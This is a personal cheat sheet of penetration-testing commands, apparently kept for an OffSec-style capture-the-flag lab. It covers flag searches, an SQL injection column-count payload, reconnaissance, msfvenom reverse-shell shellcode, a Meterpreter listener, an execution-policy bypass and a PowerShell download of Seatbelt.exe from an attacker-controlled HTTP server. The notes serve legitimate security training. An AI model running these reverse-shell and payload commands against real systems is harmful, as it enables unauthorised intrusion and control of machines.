find ~/ -type f -exec grep -l "OS{" {} \;      ----FLAG FINDER

'ORDER%20BY%206--//            -----ORDER OF COLUMNS IN SQL

find / -name "flag.txt" -print   -----flag finder in Windows environment

.dir /s /b | findstr /i "OS{"

source myenv/bin/activate              --- TO ACTIVATE THE VIRTUAL ENVIRONMENT

Get-ChildItem -Path C:\ -Recurse -File -Filter 'flag.txt'   ---Powershell cmd

sudo env "PATH=$PATH" autorecon 192.168.225.194 ---AUTORECON

```sh
SHELL=/bin/bash script -q /dev/null
```
UPGRADE THE SHELL

PAYLOADS BY TYPE msfvenom -l payloads | grep "cmd/unix*"  ^44c81b

#linux
find / -type f -name flag.txt 2>/dev/null
#windows cmd
where /r c:\ flag.txt
#windows powershell
gci -recurse -File -ErrorAction SilentlyContinue -Path "\" -filter "flag.txt"


 xfreerdp /v:192.168.215.61 /u:offsec /p:lab /drive:C:\,/home/hollacosta/Downloads            IMPORTANT CMD TO MAP A DRIVE WHILE REMOTING INTO A WINDOWS  COMPUTER

msfconsole -x "use exploit/multi/handler;set payload windows/meterpreter/reverse_tcp;set LHOST 192.168.45.181;set LPORT 443;run;"
METERPRETER REVERSE SHELL LISTENER

msfvenom -p windows/shell_reverse_tcp LHOST=192.168.45.179 LPORT=4444 -f python -b "\x00\x20" -v shellcode
REGULAR REVERSE SHELL SHELLCODE


powershell -ep bypass 
it's attempting to bypass the execution policy that might be in place, so you can more easily run things like ps1 scripts




**FORCE TO KILL ANY PORT**
For an 'all in one' linux command, check out [fuser](https://linux.die.net/man/1/fuser). `fuser -k 8080/tcp 8080/udp` should kill anything listening on 8080.


(Get-PSReadlineOption).HistorySavePath to get the location of your history file

To transfer files from your kali to a machine using PS 
PS C:\Users\dave> iwr -uri http://192.168.45.179/Seatbelt.exe -Outfile Seatbelt.exe
iwr -uri http://192.168.45.179/Seatbelt.exe -Outfile Seatbelt.exe
(Make sure your http server is open so the machines picks it up)
![[Pasted image 20231024181428.png]]



